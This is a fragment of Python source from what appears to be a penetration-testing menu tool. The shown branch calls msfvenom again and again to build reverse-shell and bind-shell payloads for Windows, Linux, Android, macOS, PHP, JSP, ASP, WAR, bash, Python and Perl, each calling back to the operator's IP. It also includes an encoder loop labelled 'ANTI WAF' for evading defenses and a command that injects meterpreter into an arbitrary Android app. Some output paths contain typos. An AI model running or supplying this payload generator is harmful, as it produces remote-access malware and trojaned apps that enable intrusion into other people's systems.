   ...
   if selection =='65':                 
      ...
      if checkParams != 1:
         if OSF[:7] == "WINDOWS":
            ...
            localCOM("msfvenom -p windows/x64/shell_reverse_tcp              LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/windows/x64/shell_reverse_tcp.exe > arsenal.tmp 2>&1")         
            localCOM("msfvenom -p windows/x64/meterpreter/reverse_http       LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/windows/x64/meterpreter/reverse_http.exe >> arsenal.tmp 2>&1")
            localCOM("msfvenom -p windows/x64/meterpreter/reverse_https      LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/windows/x64/meterpreter/reverse_https.exe >> arsenal.tmp 2>&1")
            localCOM("msfvenom -p windows/x64/meterpreter/reverse_tcp        LHOST=" + localIP + "         LPORT=" + checkParams + " -f vba   -o " + explDir + "/windows/x64/meterpreter/reverse_tcp.vba >> arsenal.tmp 2>&1")         
            if TIP[:5] != "EMPTY":
               localCOM("msfvenom -p windows/x64/meterpreter/bind_tcp        RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f exe   -o " + explDir + "/windows/x64/meterpreter/bind_tcp.exe >> arsenal.tmp 2>&1")
               localCOM("msfvenom -p windows/shell_hidden_bind_tcp           AHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f exe   -o " + explDir + "/windows/x86/shell_hidden_bind_tcp.exe >> arsenal.tmp 2>&1")
            localCOM("msfvenom -p windows/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/windows/x86/meterpreter/reverse_tcp.exe >> arsenal.tmp 2>&1")
            localCOM("msfvenom -p windows/meterpreter/reverse_http           LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/windows/x86/meterpreter/reverse_http.exe >> arsenal.tmp 2>&1")
            localCOM("msfvenom -p windows/meterpreter/reverse_https          LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/windows/x86/meterpreter/reverse_https.exe >> arsenal.tmp 2>&1")
            localCOM("msfvenom -p windows/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParams + " -f vba   -o " + explDir + "/wwindows/x86/meterpreter/reverse_tcp.vba >> arsenal.tmp 2>&1")         
            localCOM("msfvenom -p windows/meterpreter/bind_tcp               RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f exe   -o " + explDir + "/windows/x86/meterpreter/bind_tcp.exe >> arsenal.tmp 2>&1")
            localCOM("msfvenom -p windows/meterpreter/reverse_tcp_allports   LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/windows/x86/meterpreter/reverse_tcp_allports.exe >> arsenal.tmp 2>&1")         
            localCOM("msfvenom -p cmd/windows/reverse_powershell  	     LHOST=" + localIP + "         LPORT=" + checkParams + "          -o " + explDir + "/cmd/windows/x86/reverse_powershell.bat >> arsenal.tmp 2>&1")
# ANTI WAF ----         
            localCOM("msfvenom -p windows/meterpreter/reverse_tcp --platform Windows -e x86/shikata_ga_nai -i 127 LHOST=" + localIP + " LPORT=" + checkParams + " -f exe -o " + explDir + "/windows/x86/meterpreter/encoded/reverse_tcp.exe >> arsenal.tmp 2>&1")
         if OSF[:5] == "LINUX":
            print(colored("[*] Creating linux exploits...", colour3))
            localCOM("msfvenom -p linux/x86/meterpreter/reverse_tcp          LHOST=" + localIP + "         LPORT=" + checkParams + " -f elf   -o " + explDir + "/linux/x86/meterpreter/reverse_tcp.elf>> arsenal.tmp 2>&1")
            localCOM("msfvenom -p linux/x64/meterpreter/reverse_tcp          LHOST=" + localIP + "         LPORT=" + checkParams + " -f elf   -o " + explDir + "/linux/x64/meterpreter/reverse_tcp.elf >> arsenal.tmp 2>&1")
            localCOM("msfvenom -p linux/x86/meterpreter_reverse_http         LHOST=" + localIP + "         LPORT=" + checkParams + " -f elf   -o " + explDir + "/linux/x86/meterpreter_reverse_http.elf >> arsenal.tmp 2>&1")
            localCOM("msfvenom -p linux/x64/meterpreter_reverse_http         LHOST=" + localIP + "         LPORT=" + checkParams + " -f elf   -o " + explDir + "/linux/x64/meterpreter_reverse_http.elf >> arsenal.tmp 2>&1")
            localCOM("msfvenom -p linux/x86/meterpreter/bind_tcp             RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f elf   -o " + explDir + "/linux/x86/meterpreter/bind_tcp.elf >> arsenal.tmp 2>&1")
            localCOM("msfvenom -p linux/x64/shell_bind_tcp                   RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f elf   -o " + explDir + "/linux/x64/shell_bind_tcp.elf >> arsenal.tmp 2>&1")         
         if OSF[:7] == "ANDROID":
...
#           localCOM("msfvenom -p android/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParams + " R        -o " + explDir + "/android_reverse_shell.apk >> arsenal.tmp 2>&1")
            localCOM("msfvenom -x anyApp.apk android/meterpreter/reverse_tcp LHOST=" + localIP + "         LPORT=" + checkParams + "          -o " + explDir + "/aanyApp.apk android/meterpreter/reverse_tcp.apk >> arsenal.tmp 2>&1")
            localCOM("msfvenom -p android/meterpreter/reverse_http           LHOST=" + localIP + "         LPORT=" + checkParams + " R        -o " + explDir + "/android/meterpreter/reverse_http.apk >> arsenal.tmp 2>&1")
            localCOM("msfvenom -p android/meterpreter/reverse_https          LHOST=" + localIP + "         LPORT=" + checkParams + " R        -o " + explDir + "/android/meterpreter/reverse_https.apk >> arsenal.tmp 2>&1")         
         if OSF[:4] == "OS X":
            print(colored("[*] Creating mac exploits...", colour3))
            localCOM("msfvenom -p osx/x86/shell_reverse_tcp                  LHOST=" + localIP + "         LPORT=" + checkParams + " -f macho -o " + explDir + "/osx/x86/shell_reverse_tcp.macho >> arsenal.tmp 2>&1")
            localCOM("msfvenom -p osx/x86/shell_bind_tcp                     RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f macho -o " + explDir + "/osx/x86/shell_bind_tcp.macho >> arsenal.tmp 2>&1")
         if OSF[:3] == "IOS":
            print(colored("[*] Creating ios exploits...", colour3))
            print("NOT IMPLEMENTED")            
         print(colored("[*] Creating other exploits that you might require...", colour3))
         localCOM("msfvenom -p php/reverse_php                            LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + explDir + "/php/reverse_php.php >> arsenal.tmp 2>&1")
         localCOM("msfvenom -p java/jsp_shell_reverse_tcp                 LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + explDir + "/jajava/jsp_shell_reverse_tcp.jsp >> arsenal.tmp 2>&1")
         localCOM("msfvenom -p windows/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParams + " -f asp    -o " + explDir + "/windows/meterpreter/reverse_tcp.asp >> arsenal.tmp 2>&1")
         localCOM("msfvenom -p java/jsp_shell_reverse_tcp                 LHOST=" + localIP + "         LPORT=" + checkParams + " -f war    -o " + explDir + "/java/jsp_shell_reverse_tcp.war >> arsenal.tmp 2>&1")
         localCOM("msfvenom -p cmd/unix/reverse_bash                      LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + explDir + "/cmd/unix/reverse_bash.sh >> arsenal.tmp 2>&1")
         localCOM("msfvenom -p cmd/unix/reverse_python                    LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + explDir + "/cmd/unix/reverse_python.py >> arsenal.tmp 2>&1")
         localCOM("msfvenom -p cmd/unix/reverse_perl                      LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + explDir + "/cmd/unix/reverse_perl.pl >> arsenal.tmp 2>&1")
         localCOM("chmod +X *.*")
      prompt()
